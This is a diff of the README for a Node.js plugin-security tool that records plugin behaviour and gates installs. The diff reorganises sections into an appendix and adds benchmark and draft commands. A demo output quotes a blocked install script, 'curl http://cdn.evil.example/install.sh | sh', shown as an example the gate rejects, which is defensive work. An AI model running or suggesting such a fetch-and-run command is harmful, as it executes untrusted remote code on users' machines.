@@ -41,7 +41,11 @@ Underneath the dashcam sits the machinery built up over previous versions: insta
 
 Zero third-party dependencies, Node.js >= 20 (CommonJS).
 
-## Demo: a malicious plugin gets blocked at install time
+## Appendix: the pre-dashcam machinery (gates / signing / Two-Key)
+
+Sections A–F below describe the enforcement machinery built up before the 1.11.0 pivot to recording. **It still works and stays maintained (bug fixes only), but no new features go into it.** The product is the dashcam — everything above this point. Read the appendix only if you want judgment on top of recording (`config.requests` / `config.grants`, Two-Key) or the install-time gate pipeline; the demo below is still runnable as-is.
+
+### Appendix A · Demo: a malicious plugin gets blocked at install time
 
 Real output from the installation gates running on the bundled [negative example](examples/negative-plugin) — a manifest whose patch path escapes the plugin directory and whose install script pipes a remote script into `sh` (fields elided):
 
@@ -51,19 +55,36 @@ $ node bin/dsh-dashcam.js gates examples/negative-plugin --skip-signature
   "ok": false,
   "blocked": true,
   "plugin": "com.example.leaky",
-  "securityLabels": ["Untrusted"],
+  "securityLabels": ["SignatureSkipped"],
   ...
   "formatted": [
     "[structure] manifest.json field=patches[0].path — patch 路径越出插件目录",
     "[structure] manifest.json field=scripts.install — 安装脚本不在白名单：curl http://cdn.evil.example/install.sh | sh"
   ],
   "labelLines": [
-    "[Untrusted] — 调用方跳过验签，签名状态未知"
+    "[SignatureSkipped] — 调用方跳过验签，签名状态未知"
   ]
 }
 ```
 
 The pipeline fails fast: the `structure` gate blocks the install before signature/safety/contract stages ever run. Runtime messages are localized (Chinese); every failure points at an exact field and file.
+
+### Appendix B · Core model
+
+```
+manifest 声明 ─┐
+               ├─ Two-Key（交集）─→ 守卫链 ─→ 放行 / 拒绝 ─→ Ledger（哈希链）
+宿主授予   ─────┘                      ↑
+                                  One-Seal / 黑名单 / 完整性
+```
+
+- **Default deny-all**: host `grants` is empty by default.
+- **Non-invasive protection**: `policy.enforcement.mode` defaults to `advisory` — gates run first, then emit security portrait labels (`Untrusted` / `SignatureSkipped` / `Quarantined` / `ReviewRequired` / `Broken` / `Verified`); only malicious scripts and emergency blacklists block installation. `mode: 'required'` or the enterprise channel restores the "refuse to install" semantics.
+- **Legacy default config**: a manifest without a `dashcam` field is still parsed, auto-generating `{ level: 'legacy', quarantine: true }`; no declaration means no capability (the Two-Key intersection is empty), and the enterprise channel still refuses.
+- **Capability surface**: `fs.*`, `net.outbound`, `net.listen`, `proc.spawn`, `proc.signal`, `env.*`, `cred.*`. Credential paths and environment variables are automatically escalated to `cred.*`.
+- **Scope**: path globs, `host:port`, environment-variable prefix wildcards, command basenames, port subsets, signal-target whitelists. Full semantics in [docs/SPEC.md](docs/SPEC.md).
+- **Audit**: JSONL append + SHA-256 hash chain, fixed fields, offline re-computation line by line; `intercepted=true` separately records "undeclared API calls actually intercepted", directly retrievable via `Ledger.interceptions()`.
+- **Ingress observation**: request/inbound/anomaly records with `capability='llm.ingress'` share the chain and signature verification with judgment records, but are counted separately in `metrics` so they do not dilute the allow rate or interception rate; `ingress --find` only searches sampled heads (unsampled messages are not covered).
 
 ## 1.11.0 Rename: dsh-covenant → dsh-dashcam
 
@@ -117,26 +138,13 @@ node bin/dsh-dashcam.js rotate ~/.dsh/dsh-dashcam/ledger.jsonl --max-bytes 52428
 node bin/dsh-dashcam.js redact ~/.dsh/dsh-dashcam/ledger.jsonl --out share.jsonl      # fold $HOME paths before sharing (attribution fields preserved)
 node bin/dsh-dashcam.js ingress ~/.dsh/dsh-dashcam/ledger.jsonl --session <id>
 node bin/dsh-dashcam.js ingress ~/.dsh/dsh-dashcam/ledger.jsonl --find "状态栏"
+node bin/dsh-dashcam.js draft ~/.dsh/dsh-dashcam/ledger.jsonl            # reverse-engineer a requests draft from observed behavior (human convergence required)
+node bin/dsh-dashcam.js bench --n 10000                                 # per-call overhead of being recorded (guarded vs unpatched fs)
 ```
 
 > **Sharing the ledger**: records contain absolute paths (and command metadata). Run `redact` before sharing; it folds your home prefix to `$HOME` and rebuilds the chain as a fresh verifiable ledger while keeping `plugin` / `pluginVersion` / `profiled` — who did it stays, where you live does not.
 
-## Core model
-
-```
-manifest 声明 ─┐
-               ├─ Two-Key（交集）─→ 守卫链 ─→ 放行 / 拒绝 ─→ Ledger（哈希链）
-宿主授予   ─────┘                      ↑
-                                  One-Seal / 黑名单 / 完整性
-```
-
-- **Default deny-all**: host `grants` is empty by default.
-- **Non-invasive protection**: `policy.enforcement.mode` defaults to `advisory` — gates run first, then emit security portrait labels (`Untrusted` / `Quarantined` / `ReviewRequired` / `Broken` / `Verified`); only malicious scripts and emergency blacklists block installation. `mode: 'required'` or the enterprise channel restores the "refuse to install" semantics.
-- **Legacy default config**: a manifest without a `dashcam` field is still parsed, auto-generating `{ level: 'legacy', quarantine: true }`; no declaration means no capability (the Two-Key intersection is empty), and the enterprise channel still refuses.
-- **Capability surface**: `fs.*`, `net.outbound`, `net.listen`, `proc.spawn`, `proc.signal`, `env.*`, `cred.*`. Credential paths and environment variables are automatically escalated to `cred.*`.
-- **Scope**: path globs, `host:port`, environment-variable prefix wildcards, command basenames, port subsets, signal-target whitelists. Full semantics in [docs/SPEC.md](docs/SPEC.md).
-- **Audit**: JSONL append + SHA-256 hash chain, fixed fields, offline re-computation line by line; `intercepted=true` separately records "undeclared API calls actually intercepted", directly retrievable via `Ledger.interceptions()`.
-- **Ingress observation**: request/inbound/anomaly records with `capability='llm.ingress'` share the chain and signature verification with judgment records, but are counted separately in `metrics` so they do not dilute the allow rate or interception rate; `ingress --find` only searches sampled heads (unsampled messages are not covered).
+> **What being recorded costs**: run `node bin/dsh-dashcam.js bench` after any bridge change. On a Windows dev machine (1.12.x), one recorded `fs` call costs roughly **1.1–1.5 ms extra** (guard judgment + one ledger line per call; the synchronous ledger write dominates; raw `fs` is 0.04–0.5 ms). Numbers are machine-dependent — measure, don't quote.
 
 ## Directory
 
@@ -212,6 +220,10 @@ node bin/dsh-dashcam.js autopsy ./plugin --profile profile.json --patch patch.js
 node bin/dsh-dashcam.js metrics .dsh-ledger.jsonl --events events.json
 node bin/dsh-dashcam.js blacklist blacklist.json add com.example.evil 紧急下架
 node bin/dsh-dashcam.js rollout metrics.json
+
+# From observation to contract: reverse-engineer a requests draft, then measure the cost
+node bin/dsh-dashcam.js draft ~/.dsh/dsh-dashcam/ledger.jsonl --manifest ./plugin   # skip families/capabilities already declared
+node bin/dsh-dashcam.js bench --n 10000
 ```
 
 Failure reports pinpoint the field and file line, e.g.:
@@ -221,7 +233,7 @@ Failure reports pinpoint the field and file line, e.g.:
 [safety] index.js:14 field=dashcam.capabilities.requests — 代码使用 net.outbound，但 manifest 未声明
 ```
 
-## Example packages
+### Appendix C · Example packages
 
 - [examples/compliant-plugin](examples/compliant-plugin): declares fs/net/env, complete Charter, passes all gates (paired with the grant set in `examples/demo-policy.json`).
 - [examples/negative-plugin](examples/negative-plugin): out-of-bounds patch, empty reason, non-whitelisted install script, undeclared `proc.spawn` / `cred.read` / `net.outbound`. Used to verify the contract layer and the gates.
@@ -254,7 +266,7 @@ const report = bridge.coverage();
 - **Handle admission is the gate**: once `open` passes, fd-level calls go straight through — so do not assume "wrapping readFileSync secures file reads".
 - **The load window is residual risk, not a feature**: out-of-bounds calls from plugin top-level code during `require` are rewritten to allow and recorded as `deny` (`intercepted=true`) but not interrupted — a one-time trust concession reserved for legacy plugins; reads that already happened during installation cannot be recalled. Under the default combination where unsigned consumers are allowed through, that means a new plugin's top-level code gets one out-of-bounds opportunity. Close it with `policy.enforcement.observeLoadWindow = false` (out-of-bounds during load rejects installation outright); with `strictPatch = true` the window is force-closed and cannot be re-opened via config; if out-of-bounds allows occurred during load, a warning fires (`stats.observed > 0`).
 
-## Capability handles: trading patches for a small world (1.2.0 experimental)
+### Appendix D · Capability handles: trading patches for a small world (1.2.0 experimental)
 
 The Bridge can only achieve "everything I thought of is wrapped". To genuinely achieve "not declared, therefore impossible", invert the model: do not give the plugin the global API, give it a restricted object instead.
 
@@ -274,7 +286,7 @@ handles.fs.coverage();                               // { closed: true, methods:
 
 Only `fs` is covered today. `net` / `proc` extend along the same pattern: one method, one `guard.enforce`.
 
-## Capability injection: optionally make require('fs') return handles (1.5.0)
+### Appendix E · Capability injection: optionally make require('fs') return handles (1.5.0)
 
 Handles are useless if plugins never use them. But a closed surface is inherently incomplete — `openSync`, `fs.promises.open`, `watch`, `globSync` are all absent from handles; enabling it by default would break existing plugins with `TypeError`s. So `LocalHost` and `activate()` default to `sandbox.mode = 'global'` relying on the Bridge alone; `handles` is a sandbox mode the host opts into:
 
@@ -295,7 +307,7 @@ fs.readSync(fd, ...);            // TypeError: this method does not exist
 - `ctx.handles` is **always available** (including under the default `global`): new plugins can go handle-only without switching modes; `sandbox.mode` only decides whether `require('fs')` is redirected.
 - The default must preserve availability: without `handles`, existing plugins run with zero changes.
 
-## Why non-invasive
+### Appendix F · Why non-invasive
 
 The installation gate's job is not "decide for the user what to install", but to **articulate the risk and leave the execution point with the host**:
 
